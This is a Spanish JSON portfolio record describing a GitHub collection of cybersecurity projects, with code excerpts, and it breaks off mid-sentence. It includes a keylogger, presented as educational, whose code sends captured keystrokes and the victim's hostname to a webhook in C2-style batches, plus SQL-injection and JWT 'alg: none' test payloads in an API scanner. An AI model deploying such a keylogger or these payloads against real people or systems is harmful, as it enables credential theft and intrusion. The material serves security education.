{
  "slug": "cybersecurity-projects",
  "language": "es",
  "title": "60 Proyectos de Ciberseguridad",
  "subtitle": "Proyectos prácticos de seguridad para aprender, clonar y construir portfolio",
  "description": "Una colección creciente de 60 proyectos de ciberseguridad que van desde herramientas CLI para principiantes hasta aplicaciones full-stack avanzadas. 5 proyectos están completamente construidos con código fuente completo; los 55 restantes tienen guías de implementación detalladas que estoy construyendo activamente, abierto a colaboradores también. Clónalos como templates, estudia los patrones, o personalízalos para tu propio portfolio.",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## Keylogger\n\n**Categoría:** Intermedio | **Estado:** Completo\n\nUn keylogger educativo construido para investigación de seguridad y entrenamiento de pentesting. El proyecto demuestra cómo el malware real captura credenciales a través de hooks de teclado, contexto de ventana activa y exfiltración de comando y control (C2). Lo que lo hace técnicamente interesante es el tracking de ventanas cross-platform y la entrega por webhook en batches que simula patrones de comunicación reales de APT.\n\n### Cómo Funciona\n\nEl keylogger usa el modelo event-driven de pynput para hookear eventos de teclado a nivel de OS. Cuando se presiona una tecla, se procesa en un dataclass `KeyEvent` que captura el timestamp, representación de la tecla y contexto de ventana activa. Los eventos fluyen a través de tres subsistemas: `LogManager` maneja I/O de archivos con rotación automática, `WebhookDelivery` buferea eventos para entrega C2 por batches, y `WindowTracker` proporciona detección de título de ventana específica por plataforma. Todo es thread-safe con locks protegiendo estado compartido.\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nEl WindowTracker abstrae las diferencias de OS. Windows usa win32gui con psutil para nombres de proceso, macOS usa NSWorkspace, y Linux ejecuta xdotool. Las verificaciones de ventana están limitadas a intervalos de 500ms para evitar sobrecargar las APIs del OS.\n\n### Decisiones Técnicas\n\n- pynput sobre pyHook/keyboard: Soporte cross-platform out of the box sin implementaciones separadas para Windows/Linux\n- Dataclasses para KeyEvent y Config: Serialización limpia a JSON para payloads de webhook, config cuasi-inmutable\n- Entrega de webhook por batches: Los eventos se bufferean hasta alcanzar el tamaño de batch (50 por defecto), imitando patrones de tráfico C2 real que evitan beaconing por cada keystroke\n- Rotación de log por tamaño: Previene agotamiento de disco en capturas de larga duración, rota a 5MB por defecto\n- Threading.Event para estado: Flags `is_running` y `is_logging` permiten shutdown limpio y toggle con F9 sin race conditions\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nLa entrega de webhook incluye hostname para identificación de víctima, agrupa eventos en un único payload, y solo limpia el buffer en entrega exitosa. Las entregas fallidas retienen eventos para reintento, que es como el malware real mantiene persistencia a través de interrupciones de red.\n\n### Stack\nPython 3.13+, pynput, requests, win32gui/psutil (Windows), pyobjc (macOS), xdotool (Linux)\n\n---\n\n## Herramienta de DNS Lookup\n\n**Categoría:** Intermedio | **Estado:** Completo\n\nUn CLI profesional de consultas DNS que va más allá de simples lookups. La herramienta realiza consultas multi-registro, lookups inversos, procesamiento por lotes y obtención de WHOIS con output de terminal Rich. La capacidad destacada es DNS trace, que visualiza el path de resolución completo desde root servers a través de TLD servers hasta nameservers autoritativos, mostrando exactamente cómo funciona la delegación DNS.\n\n### Cómo Funciona\n\nEl resolver usa las capacidades async de dnspython para consultar múltiples tipos de registro concurrentemente. Para lookups estándar, dispara consultas paralelas para cada tipo de registro solicitado y agrega resultados. Para tracing, implementa resolución iterativa manualmente, comenzando en root servers y siguiendo referrals NS hacia abajo en la jerarquía hasta alcanzar la respuesta autoritativa.\n\nLa capa CLI usa Typer con integración Rich para spinners de progreso durante consultas y tablas de output formateadas. Los resultados pueden exportarse como JSON para scripting o mostrarse con tipos de registro codificados por color y formateo de TTL legible.\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # Extraer registros NS y seguir referrals\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\nEste es el núcleo del comando trace. Camina manualmente la jerarquía DNS enviando consultas a cada nivel y siguiendo referrals, manejando glue records cuando están disponibles o resolviendo IPs de nameserver cuando no.\n\n### Decisiones Técnicas\n\n- Elegí resolución iterativa sobre recursiva para tracing para exponer la cadena de delegación real en lugar de solo obtener una respuesta final\n- Usé `asyncio.gather` con `return_exceptions=True` para manejar fallos parciales graciosamente en lookups por lotes sin matar toda la operación\n- Implementé formateo de TTL que auto-escala entre segundos, minutos, horas y días para legibilidad\n- Separé el formateo de output completamente de la lógica de resolución, haciendo el export JSON trivial\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\nLos lookups por lotes se despliegan concurrentemente en lugar de secuencialmente, así que consultar 100 dominios toma aproximadamente el mismo tiempo que consultar uno.\n\n### Stack\nPython 3.13, dnspython, Typer, Rich, python-whois, pytest, mypy, ruff\n\n---\n\n## Escáner de Seguridad API Full Stack\n\n**Categoría:** Intermedio | **Estado:** Completo\n\nUna plataforma dockerizada de testing de seguridad que escanea APIs por vulnerabilidades comunes mapeadas al OWASP API Security Top 10. El escáner orquesta cuatro módulos especializados cubriendo rate limiting, fallos de autenticación, SQL injection y vulnerabilidades IDOR/BOLA. Lo que lo hace técnicamente interesante es el enfoque estadístico para detección ciega de vulnerabilidades y el manejo de requests seguro para producción que previene que el escáner mismo cause disrupciones de servicio.\n\n### Cómo Funciona\n\nEl backend sigue una arquitectura en capas con FastAPI manejando routing, una capa de servicio orquestando lógica de negocio, y una capa de repositorio abstrayendo operaciones de base de datos. Cada escáner de vulnerabilidades hereda de una clase BaseScanner que proporciona funcionalidad HTTP común incluyendo espaciado de requests, lógica de retry con exponential backoff, y recolección de evidencia. Cuando se inicia un escaneo, el ScanService instancia las clases de escáner solicitadas, las ejecuta secuencialmente, y persiste resultados a través de la capa de repositorio.\n\nLos módulos de escáner implementan estrategias de detección distintas basadas en tipo de vulnerabilidad. SQLi basado en error busca firmas de base de datos en respuestas. La detección basada en boolean compara longitudes de respuesta entre condiciones inyectadas true y false. La detección time-based blind establece un baseline de tiempo de respuesta usando múltiples muestras, luego usa análisis estadístico para identificar delays causados por payloads sleep mientras minimiza falsos positivos. El escáner de auth prueba autenticación faltante, aceptación de algoritmo none en JWT, y bypasses de validación de firma.\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\nEsta detección de SQLi time-based usa baselining estadístico en lugar de thresholds hardcodeados, tomando múltiples muestras para establecer varianza de respuesta normal antes de probar payloads de delay a través de variaciones de sintaxis MySQL, PostgreSQL y MSSQL.\n\n### Decisiones Técnicas\n\n- Usé patrón de clase base abstracta para escáneres así que la lógica HTTP común como rate limiting y manejo de retry vive en un lugar mientras cada tipo de vulnerabilidad implementa su propia estrategia de detección\n- Implementé espaciado de requests con jitter configurable para evitar sobrecargar targets o triggear rate limits durante escaneos, calculado dinámicamente basado en max requests y ventana de tiempo\n- El testing de JWT cubre variaciones de case del algoritmo none ya que algunas implementaciones solo verifican lowercase, más remoción de firma y aceptación de tokens malformados\n- El testing de bypass de rate limit incluye spoofing de header IP via X-Forwarded-For y X-Real-IP, más variaciones de path de endpoint que a veces bypasean rate limiters case sensitive\n- El frontend usa Zustand con immer para actualizaciones de estado inmutables y middleware de persistencia para preservar estado de formularios entre sesiones con expiración automática después de siete días\n- Type guards validan todas las respuestas API en runtime antes de que los datos entren al estado de la aplicación, atrapando violaciones de contrato del backend temprano\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nEl test de algoritmo none de JWT construye tokens con varias permutaciones de case de \"none\" como algoritmo, elimina la firma, y verifica si la API los acepta. Un endpoint vulnerable retornaría 200, indicando que procesa tokens sin firma.\n\n### Stack\nPython, FastAPI, SQLAlchemy, PostgreSQL, React, TypeScript, Zustand, TanStack Query, Docker, Nginx\n\n---\n\n## FastAPI-420 (API Rate Limiter)\n\n**Categoría:** Avanzado | **Estado:** Completo\n\nUna librería de rate limiting de grado producción para FastAPI que implementa un sistema de defensa de tres capas contra abuso de API y ataques DDoS. El \"420\" en el nombre referencia el viejo código de respuesta HTTP 420 \"Enhance Your Calm\" de Twitter, que la librería resurface en lugar del estándar 429. Lo que hace esto técnicamente interesante es la convergencia de varios problemas difíciles: contadores distribuidos atómicos via scripts Lua, fingerprinting de cliente sofisticado que considera explotación de prefijos IPv6 /64, un patrón circuit breaker con múltiples modos de defensa, y una capa de abstracción limpia que te permite intercambiar algoritmos y backends de storage sin tocar código de aplicación. Todo está tipado de punta a punta con protocols verificables en runtime y viene con tanto middleware bloqueante como una variante \"slow down\" que añade delays progresivos en lugar de rechazos duros.\n\n### Cómo Funciona\n\nLa arquitectura opera en tres capas defensivas que las requests deben pasar secuencialmente. La Capa 1 maneja limiting por usuario por endpoint usando fingerprints compuestos construidos desde direcciones IP, user agents, tokens de autenticación, y opcionalmente fingerprints TLS y orden de headers. La Capa 2 protege endpoints individuales de ser saturados aplicando límites globales por ruta, así que un único endpoint no puede consumir toda la capacidad disponible. La Capa 3 es un circuit breaker que monitorea tráfico total de API y puede dispararse a diferentes modos de defensa cuando se exceden thresholds.\n\nEl coordinador de defensa en capas procesa requests a través de las tres capas y lanza una excepción `EnhanceYourCalm` (HTTP 420) al primer fallo. Cada capa construye su propia key de rate limit usando un formato estructurado: `{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`. Esta estructura de key significa que puedes inspeccionar Redis directamente durante debugging e inmediatamente entender lo que estás viendo.\n\n```python\nasync def check_all_layers(\n    self,\n    request: Request,\n    fingerprint: FingerprintData,\n    endpoint: str,\n    rules: list[RateLimitRule],\n) -> RateLimitResult:\n    \"\"\"\n    Check all defense layers in order\n    \"\"\"\n    context = DefenseContext(\n        fingerprint = fingerprint,\n        endpoint = endpoint,\n        method = request.method,\n        is_authenticated = fingerprint.auth_identifier is not None,\n    )\n\n    layer3_result = await self._check_layer3_global(context)\n    if not layer3_result.allowed:\n        self._log_violation(layer3_result, context)\n        raise EnhanceYourCalm(\n            result = layer3_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = \"API is under heavy load. Please try again later.\",\n        )\n\n    layer2_result = await self._check_layer2_endpoint(context, rules)\n    if not layer2_result.allowed:\n        self._log_violation(layer2_result, context)\n        raise EnhanceYourCalm(\n            result = layer2_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    layer1_result = await self._check_layer1_user(context, rules)\n    if not layer1_result.allowed:\n        self._log_violation(layer1_result, context)\n        raise EnhanceYourCalm(\n            result = layer1_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    return layer1_result.result\n```\n\nEl sistema de defensa en capas cortocircuita al primer fallo, verificando salud global antes de desperdiciar ciclos en lookups por usuario. El contexto de defensa lleva estado de autenticación y scores de reputación que capas downstream pueden usar para tomar decisiones de bypass.\n\nEl storage está abstraído detrás de una interfaz protocol con dos implementaciones: Redis para deployments distribuidos y en memoria para single instance o desarrollo. El backend Redis precarga scripts Lua al startup y los ejecuta via EVALSHA para garantizar atomicidad sin retransmitir cuerpos de script en cada llamada. Si Redis retorna NOSCRIPT (scripts expulsados del cache), el backend automáticamente recarga y reintenta.\n\nLa librería soporta cuatro algoritmos de rate limiting que todos implementan la misma clase abstracta `BaseAlgorithm`: sliding window usa interpolación ponderada entre dos ventanas fijas para aproximadamente 99.997% de precisión con O(1) de memoria por cliente; token bucket permite bursting controlado hasta la capacidad del bucket mientras aplica rates promedio; fixed window es más simple pero sufre del problema de burst en fronteras; leaky bucket es un alias de sliding window ya que las implementaciones son funcionalmente equivalentes para la mayoría de casos de uso.\n\n```lua\n--[[\nsliding_window.lua\nAtomic sliding window counter rate limiting.\nReturns: {allowed (0/1), remaining, reset_after}\n--]]\n\nlocal key = KEYS[1]\nlocal window_seconds = tonumber(ARGV[1])\nlocal limit = tonumber(ARGV[2])\nlocal now = tonumber(ARGV[3])\n\nlocal current_window = math.floor(now / window_seconds)\nlocal previous_window = current_window - 1\nlocal elapsed_ratio = (now % window_seconds) / window_seconds\n\nlocal current_key = key .. \":\" .. current_window\nlocal previous_key = key .. \":\" .. previous_window\n\nlocal current_count = tonumber(redis.call('GET', current_key)) or 0\nlocal previous_count = tonumber(redis.call('GET', previous_key)) or 0\n\nlocal weighted_count = math.floor(previous_count * (1 - elapsed_ratio) + current_count)\nlocal reset_after = window_seconds - (now % window_seconds)\n\nif weighted_count >= limit then\n    return {0, 0, reset_after, reset_after}\nend\n\nredis.call('INCR', current_key)\nredis.call('EXPIRE', current_key, window_seconds * 2)\n\nlocal new_weighted = math.floor(previous_count * (1 - elapsed_ratio) + current_count + 1)\nlocal remaining = math.max(0, limit - new_weighted)\n\nreturn {1, remaining, reset_after, 0}\n```\n\nEl script Lua de sliding window corre atómicamente en Redis. La fórmula de interpolación ponderada `previous_count * (1 - elapsed_ratio) + current_count` transiciona suavemente entre ventanas, eliminando la vulnerabilidad de burst en fronteras donde atacantes podrían hacer 2x el límite cronometrando requests en bordes de ventana. Las keys expiran después de 2x la duración de ventana para asegurar que la ventana anterior siempre esté disponible para el cálculo.\n\nEl sistema de fingerprinting es donde esto se pone particularmente interesante. En lugar de depender únicamente de direcciones IP, el `CompositeFingerprinter` construye identificadores desde múltiples señales basadas en niveles de intensidad configurables. El modo strict usa todo: IP, user agent, headers accept, orden de headers, tokens auth, fingerprints TLS/JA3, y ASN geográfico. El modo normal (por defecto) usa IP, user agent, y auth. El modo relaxed usa solo IP y auth para máxima compatibilidad.\n\n```python\nclass CompositeFingerprinter:\n    \"\"\"\n    Combines multiple fingerprinting methods based on configuration\n\n    Preset levels determine which extractors are used:\n    - strict: All methods (IP, headers, auth, TLS, geo)\n    - normal: IP + User-Agent + Auth (default)\n    - relaxed: IP + Auth only\n    - custom: Configured via settings\n    \"\"\"\n    def __init__(\n        self,\n        level: FingerprintLevel = FingerprintLevel.NORMAL,\n        ip_extractor: IPExtractor | None = None,\n        headers_extractor: HeadersExtractor | None = None,\n        auth_extractor: AuthExtractor | None = None,\n        use_ip: bool = True,\n        use_user_agent: bool = True,\n        use_accept_headers: bool = False,\n        use_header_order: bool = False,\n        use_auth: bool = True,\n        use_tls: bool = False,\n        use_geo: bool = False,\n    ) -> None:\n        self.level = level\n        self._ip_extractor = ip_extractor or IPExtractor()\n        self._headers_extractor = headers_extractor or HeadersExtractor(\n            use_header_order = use_header_order,\n        )\n        self._auth_extractor = auth_extractor or AuthExtractor()\n\n        if level == FingerprintLevel.STRICT:\n            self.use_ip = True\n            self.use_user_agent = True\n            self.use_accept_headers = True\n            self.use_header_order = True\n            self.use_auth = True\n            self.use_tls = True\n            self.use_geo = True\n        elif level == FingerprintLevel.RELAXED:\n            self.use_ip = True\n            self.use_user_agent = False\n            self.use_accept_headers = False\n            self.use_header_order = False\n            self.use_auth = True\n            self.use_tls = False\n            self.use_geo = False\n        # ... continues for other levels\n```\n\nEl orden de headers es particularmente ingenioso para fingerprinting porque es específico del navegador y no configurable por el usuario. Chrome, Firefox y Safari todos envían headers en órdenes diferentes, así que incluso si un atacante falsifica un string de user agent, el orden de headers a menudo delata al cliente real.\n\nPara clientes IPv6, las direcciones raw se normalizan a su prefijo de red /64. Esto importa porque usuarios residenciales y móviles típicamente controlan bloques /64 enteros (aproximadamente 18 quintillones de direcciones), haciendo el rate limiting ingenuo por IP completamente inefectivo. Un atacante podría trivialmente rotar a través de direcciones dentro de su asignación. La normalización colapsa todas las direcciones en un /64 a la dirección de red, tratándolas como una única identidad.\n\n```python\ndef _normalize_ip(self, ip_str: str) -> str:\n    \"\"\"\n    Normalize IP address for rate limiting\n\n    IPv6 addresses are normalized to their /64 network prefix\n    since users typically control entire /64 blocks.\n    \"\"\"\n    try:\n        addr = ip_address(ip_str)\n    except ValueError:\n        return ip_str\n\n    if isinstance(addr, IPv6Address):\n        if addr.ipv4_mapped:\n            return str(addr.ipv4_mapped)\n\n        network = ip_network(\n            f\"{ip_str}/{self.ipv6_prefix_length}\",\n            strict = False,\n        )\n        return str(network.network_address)\n\n    return str(addr)\n```\n\nEl extractor de autenticación implementa una cadena de fallback: claim subject de JWT primero, luego header de API key, luego parámetro de query de API key, luego cookie de sesión. El parsing de JWT funciona con o sin verificación de secreto ya que la librería solo necesita identidad para rate limiting, no autorización. Cuando un secreto no está configurado, extrae el claim subject sin validación, lo cual es seguro porque la key de rate limit es solo un identificador de bucket, no una decisión de confianza.\n\n### Decisiones Técnicas\n\n- Elegí sliding window sobre fixed window puro para eliminar el problema de burst en fronteras. Con fixed windows, un atacante que hace 100 requests a las 11:59:59 y otras 100 a las 12:00:01 efectivamente obtiene 200 requests en 2 segundos a pesar de un límite de 100/minuto. La interpolación ponderada transiciona suavemente entre ventanas, manteniendo conteos precisos sin importar cuándo llegan las requests.\n\n- Usé EVALSHA con hashes de script cacheados en lugar de EVAL para evitar retransmitir cuerpos de script Lua en cada operación Redis. Los scripts se cargan una vez al startup via `script_load` y los hashes SHA1 se cachean. Si Redis retorna NOSCRIPT (indicando que scripts fueron expulsados del script cache), el backend atrapa la excepción, recarga todos los scripts, y reintenta transparentemente.\n\n- Implementé normalización de prefijo IPv6 /64 porque el enfoque estándar /128 por dirección es trivialmente bypasseable. La mayoría de asignaciones IPv6 dan a usuarios al mínimo un /64, y muchos ISPs entregan prefijos /56 o incluso /48. El parámetro configurable `ipv6_prefix_length` permite a operadores ajustar esto para su modelo de amenaza.\n\n- Construí el circuit breaker con múltiples modos de defensa en lugar de solo abierto/cerrado. El modo adaptivo permite pasar usuarios autenticados cuando el circuit se dispara, manteniendo servicio para usuarios legítimos durante ataques. El modo lockdown restringe tráfico a clientes con altos scores de reputación. El estado half-open permite testing de recuperación gradual antes de cerrar completamente el circuit.\n\n- El sistema de fingerprinting usa orden de headers como señal anti-spoofing. Los navegadores envían headers en órdenes determinísticos pero específicos del navegador que usuarios no pueden cambiar. Incluso si un atacante pone un string de user agent de Chrome, su orden de headers podría revelar que realmente están usando curl o un script Python.\n\n- El storage en memoria usa `OrderedDict` con eviction LRU para limitar uso de memoria. Cuando se excede max keys, las entradas más viejas (por tiempo de acceso) se expulsan primero. Una tarea asyncio en background periódicamente limpia entradas expiradas para prevenir memory leaks de buckets de rate limit abandonados.\n\n- El sistema de inyección de dependencias proporciona múltiples patrones de integración: un decorador `@limiter.limit()` para límites a nivel de ruta, una clase `RateLimitDep` que funciona con `Depends()` de FastAPI, un `ScopedRateLimiter` para aplicar diferentes reglas a grupos de rutas, y middleware completo para cobertura total. Esta flexibilidad significa que la librería funciona sin importar cómo esté estructurada tu app FastAPI.\n\n- Construí un `SlowDownMiddleware` alternativo que añade delays progresivos en lugar de bloqueos duros. Esto es útil para degradación gradual donde quieres desincentivar abuso sin cortar completamente a usuarios borderline. Los incrementos de delay son configurables hasta un máximo.\n\n```python\nclass RateLimitDep:\n    \"\"\"\n    FastAPI dependency for rate limiting\n\n    Usage:\n        @app.get(\"/api/data\", dependencies=[Depends(RateLimitDep(\"100/minute\"))])\n        async def get_data():\n            return {\"data\": \"value\"}\n\n        # Or with result access:\n        @app.get(\"/api/data\")\n        async def get_data(limit_result: Annotated[RateLimitResult, Depends(RateLimitDep(\"100/minute\"))]):\n            return {\"remaining\": limit_result.remaining}\n    \"\"\"\n    def __init__(\n        self,\n        *rules: str,\n        limiter: RateLimiter | None = None,\n        key_func: Callable[[Request], str] | None = None,\n    ) -> None:\n        self.rules = [RateLimitRule.parse(rule) for rule in rules]\n        self._limiter = limiter\n        self.key_func = key_func\n\n    async def __call__(self, request: Request) -> RateLimitResult:\n        \"\"\"\n        Check rate limit and return result\n        \"\"\"\n        rule_strings = [str(rule) for rule in self.rules]\n        return await self.limiter.check(\n            request,\n            *rule_strings,\n            key_func = self.key_func,\n            raise_on_limit = True,\n        )\n```\n\nLa clase dependency parsea strings de reglas al tiempo de instanciación en lugar de en cada request, y expone el `RateLimitResult` así que las rutas pueden acceder a quota restante, tiempos de reset, y otros metadatos para su propia lógica.\n\n- Usé `model_validator` de Pydantic para validación de configuración con enforcement específico por ambiente. Los deployments de producción requieren ya sea una URL de Redis o reconocimiento explícito de que el fallback a memoria es aceptable. Los strings de rate limit se validan al tiempo de carga de config así que reglas malformadas fallan rápido en lugar de en runtime.\n\n- La jerarquía de excepciones distingue entre rate limit excedido (culpa del usuario), errores de storage (problema de infraestructura), errores de configuración (culpa del desarrollador), y circuit breaker abierto (protección del sistema). Cada tipo de excepción lleva detalles estructurados para logging y debugging en lugar de solo strings de mensaje.\n\n### Stack\nPython 3.12+, FastAPI, Starlette, Redis, Pydantic, Pydantic Settings, PyJWT, Lua, asyncio, mypy (strict mode), ruff, pylint\n\n---\n\n## Chat P2P Encriptado\n\n**Categoría:** Avanzado | **Estado:** Activo\n\nUna implementación completa del Signal Protocol para mensajería encriptada de extremo a extremo, construida desde cero sin atajos criptográficos. El sistema implementa X3DH (Extended Triple Diffie-Hellman) para intercambio de claves asíncrono y el algoritmo Double Ratchet para forward secrecy, lo que significa que cada mensaje individual usa una clave de encriptación única derivada a través de una cadena de operaciones criptográficas. La autenticación es completamente sin contraseña via passkeys WebAuthn/FIDO2, eliminando bases de datos de credenciales por completo.\n\nLa arquitectura usa tres bases de datos, cada una optimizada para su rol específico: PostgreSQL maneja identidad de usuario y storage de credenciales con garantías ACID, SurrealDB proporciona storage de documentos en tiempo real con live queries nativas para entrega instantánea de mensajes, y Redis gestiona challenges WebAuthn efímeros con expiración automática TTL. El frontend está construido en SolidJS en lugar de React, usando reactividad de grano fino para un bundle más pequeño y mejor performance en un contexto de mensajería en tiempo real.\n\n### Cómo Funciona\n\nEl pipeline de encriptación comienza cuando un usuario inicia una conversación. El remitente obtiene el prekey bundle del destinatario del servidor, que contiene su clave de identidad de largo plazo, un signed prekey de mediano plazo (rotado cada 48 horas), y opcionalmente un one-time prekey de uso único. El protocolo X3DH realiza cuatro operaciones Diffie-Hellman entre varias combinaciones de estas claves y un keypair efímero recién generado, luego deriva un secreto compartido a través de HKDF. Este secreto compartido inicializa el Double Ratchet.\n\nUna vez que el ratchet está inicializado, cada mensaje dispara un paso de ratchet de clave simétrica que deriva una clave de mensaje única y avanza la cadena. Cuando el destinatario responde, ocurre un paso de DH ratchet: ambas partes generan nuevos keypairs efímeros, realizan intercambios DH frescos, y derivan claves root y chain completamente nuevas. Esto significa que comprometer una única clave de mensaje no revela nada sobre mensajes pasados o futuros. La implementación también maneja entrega fuera de orden cacheando claves de mensajes saltados, limitadas por límites configurables para prevenir ataques de agotamiento de memoria.\n\n```python\ndef encrypt_message(\n    self,\n    state: DoubleRatchetState,\n    plaintext: bytes,\n    associated_data: bytes\n) -> EncryptedMessage:\n    \"\"\"\n    Encrypts message and advances sending ratchet\n    \"\"\"\n    state.sending_chain_key, message_key = self._kdf_ck(\n        state.sending_chain_key\n    )\n\n    nonce, ciphertext = self._encrypt_with_message_key(\n        message_key,\n        plaintext,\n        associated_data\n    )\n\n    if state.dh_private_key:\n        dh_public = state.dh_private_key.public_key()\n        dh_public_bytes = dh_public.public_bytes(\n            encoding = serialization.Encoding.Raw,\n            format = serialization.PublicFormat.Raw\n        )\n    else:\n        dh_public_bytes = b'\\x00' * X25519_KEY_SIZE\n\n    encrypted_msg = EncryptedMessage(\n        ciphertext = ciphertext,\n        nonce = nonce,\n        dh_public_key = dh_public_bytes,\n        message_number = state.sending_message_number,\n        previous_chain_length = state.previous_sending_chain_length\n    )\n\n    state.sending_message_number += 1\n    return encrypted_msg\n```\n\nEste es el path de encriptación central. Cada llamada deriva una clave de mensaje fresca de la chain key usando HMAC, encripta con AES-256-GCM, y empaqueta la clave pública DH actual del remitente en el header del mensaje así el destinatario puede realizar el paso de DH ratchet.\n\nLa capa WebSocket mantiene conexiones persistentes con heartbeats automáticos y lógica de reconexión. Cuando llega un mensaje, el sistema de live query de SurrealDB lo empuja directamente al connection manager del destinatario, que lo enruta a todos sus dispositivos activos. El connection manager aplica límites de conexión por usuario y maneja degradación graciosa cuando las conexiones mueren.\n\n```python\nasync def connect(self, websocket: WebSocket, user_id: UUID) -> bool:\n    \"\"\"\n    Accept WebSocket connection and register user\n    \"\"\"\n    await websocket.accept()\n\n    if user_id not in self.active_connections:\n        self.active_connections[user_id] = []\n\n    if len(self.active_connections[user_id]) >= WS_MAX_CONNECTIONS_PER_USER:\n        await self._send_error(\n            websocket,\n            \"max_connections\",\n            f\"Maximum {WS_MAX_CONNECTIONS_PER_USER} connections per user\"\n        )\n        await websocket.close()\n        return False\n\n    self.active_connections[user_id].append(websocket)\n\n    try:\n        await presence_service.set_user_online(user_id)\n    except Exception as e:\n        await self._send_error(websocket, \"database_error\", \"Failed to initialize connection\")\n        self.active_connections[user_id].remove(websocket)\n        if not self.active_connections[user_id]:\n            del self.active_connections[user_id]\n        await websocket.close()\n        return False\n\n    self.heartbeat_tasks[user_id] = asyncio.create_task(\n        self._heartbeat_loop(websocket, user_id)\n    )\n\n    await self._subscribe_to_messages(user_id)\n    return True\n```\n\nLa gestión de conexiones maneja escenarios multi-dispositivo, aplica límites, inicializa tracking de presencia, inicia el loop de heartbeat, y se suscribe a live queries de SurrealDB para mensajes entrantes, todo atómicamente con cleanup apropiado en cualquier fallo.\n\n### Decisiones Técnicas\n\n**Keypairs duales X25519 + Ed25519 para identidad**: El protocolo requiere tanto key agreement (para operaciones DH) como firma (para autenticación de prekey). En lugar de usar una única curva con transformaciones, mantener keypairs X25519 y Ed25519 separados es más limpio y evita footguns criptográficos sutiles.\n\n**SurrealDB para datos en tiempo real**: PostgreSQL con 